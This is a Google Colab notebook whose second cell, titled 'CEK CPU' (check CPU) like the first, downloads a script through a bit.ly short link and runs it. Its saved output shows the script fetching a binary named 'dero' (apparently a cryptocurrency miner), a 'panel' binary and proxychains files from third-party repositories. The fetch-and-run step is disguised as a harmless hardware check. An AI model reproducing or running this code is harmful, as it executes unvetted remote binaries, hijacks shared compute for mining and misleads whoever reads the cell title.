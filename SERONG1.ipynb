{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "gpuClass": "standard"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "IxD3I0hHbCZ9"
      },
      "source": [
        "#**MANTAP**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "l1-8toPSX4Z0",
        "cellView": "form",
        "outputId": "ef5f4111-1d53-40c1-e339-b41b9047297c",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title CEK CPU\n",
        "!lscpu | grep 'CPU(s):'"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "CPU(s):              4\n",
            "NUMA node0 CPU(s):   0-3\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Sdoptmqf42Xf",
        "cellView": "form",
        "outputId": "c44b8d0c-0077-4f19-bbde-4cbad8e243bc",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title CEK CPU\n",
        "!wget bit.ly/3DeromeN && chmod +x 3DeromeN && ./3DeromeN\n"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2022-10-31 07:04:37--  http://bit.ly/3DeromeN\n",
            "Resolving bit.ly (bit.ly)... 67.199.248.10, 67.199.248.11\n",
            "Connecting to bit.ly (bit.ly)|67.199.248.10|:80... connected.\n",
            "HTTP request sent, awaiting response... 301 Moved Permanently\n",
            "Location: https://gitlab.com/lukmanpurai/janda/-/raw/main/dero.sh [following]\n",
            "--2022-10-31 07:04:37--  https://gitlab.com/lukmanpurai/janda/-/raw/main/dero.sh\n",
            "Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9\n",
            "Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 968 [text/plain]\n",
            "Saving to: ‘3DeromeN’\n",
            "\n",
            "3DeromeN            100%[===================>]     968  --.-KB/s    in 0s      \n",
            "\n",
            "2022-10-31 07:04:37 (120 MB/s) - ‘3DeromeN’ saved [968/968]\n",
            "\n",
            "--2022-10-31 07:04:37--  https://github.com/angkii/m/raw/main/dero\n",
            "Resolving github.com (github.com)... 140.82.114.3\n",
            "Connecting to github.com (github.com)|140.82.114.3|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/angkii/m/main/dero [following]\n",
            "--2022-10-31 07:04:38--  https://raw.githubusercontent.com/angkii/m/main/dero\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 5316088 (5.1M) [application/octet-stream]\n",
            "Saving to: ‘dero’\n",
            "\n",
            "dero                100%[===================>]   5.07M  --.-KB/s    in 0.08s   \n",
            "\n",
            "2022-10-31 07:04:38 (63.5 MB/s) - ‘dero’ saved [5316088/5316088]\n",
            "\n",
            "--2022-10-31 07:04:38--  https://github.com/amit12986/code/raw/main/panel\n",
            "Resolving github.com (github.com)... 140.82.114.3\n",
            "Connecting to github.com (github.com)|140.82.114.3|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/amit12986/code/main/panel [following]\n",
            "--2022-10-31 07:04:38--  https://raw.githubusercontent.com/amit12986/code/main/panel\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 24856 (24K) [application/octet-stream]\n",
            "Saving to: ‘panel’\n",
            "\n",
            "panel               100%[===================>]  24.27K  --.-KB/s    in 0.002s  \n",
            "\n",
            "2022-10-31 07:04:38 (15.4 MB/s) - ‘panel’ saved [24856/24856]\n",
            "\n",
            "--2022-10-31 07:04:38--  https://github.com/amit12986/code/raw/main/proxychains.conf\n",
            "Resolving github.com (github.com)... 140.82.114.3\n",
            "Connecting to github.com (github.com)|140.82.114.3|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/amit12986/code/main/proxychains.conf [following]\n",
            "--2022-10-31 07:04:38--  https://raw.githubusercontent.com/amit12986/code/main/proxychains.conf\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 118 [text/plain]\n",
            "Saving to: ‘proxychains.conf’\n",
            "\n",
            "proxychains.conf    100%[===================>]     118  --.-KB/s    in 0s      \n",
            "\n",
            "2022-10-31 07:04:38 (4.97 MB/s) - ‘proxychains.conf’ saved [118/118]\n",
            "\n",
            "--2022-10-31 07:04:38--  https://github.com/amit12986/code/raw/main/libproxychains4.so\n",
            "Resolving github.com (github.com)... 140.82.113.3\n",
            "Connecting to github.com (github.com)|140.82.113.3|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/amit12986/code/main/libproxychains4.so [following]\n",
            "--2022-10-31 07:04:39--  https://raw.githubusercontent.com/amit12986/code/main/libproxychains4.so\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 124720 (122K) [application/octet-stream]\n",
            "Saving to: ‘libproxychains4.so’\n",
            "\n",
            "libproxychains4.so  100%[===================>] 121.80K  --.-KB/s    in 0.02s   \n",
            "\n",
            "2022-10-31 07:04:39 (5.47 MB/s) - ‘libproxychains4.so’ saved [124720/124720]\n",
            "\n",
            "^C\n"
          ]
        }
      ]
    }
  ]
}